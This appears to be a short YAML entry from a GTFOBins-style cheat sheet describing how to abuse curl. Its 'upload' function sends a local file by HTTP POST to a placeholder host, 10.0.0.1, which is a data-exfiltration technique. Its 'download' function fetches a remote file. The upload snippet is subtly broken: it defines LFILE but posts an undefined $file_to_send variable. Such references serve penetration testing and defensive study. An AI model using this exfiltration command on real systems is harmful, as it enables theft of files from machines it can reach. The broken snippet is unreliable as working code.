---
functions:
  upload:
    - description: Send local file with an HTTP POST request.
      code: |
        URL=http://10.0.0.1/
        LFILE=file_to_send
        curl -X POST -d @$file_to_send $URL
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |-
        export URL=http://10.0.0.1/file_to_get
        export LFILE=file_to_get
        curl $URL -o $LFILE
---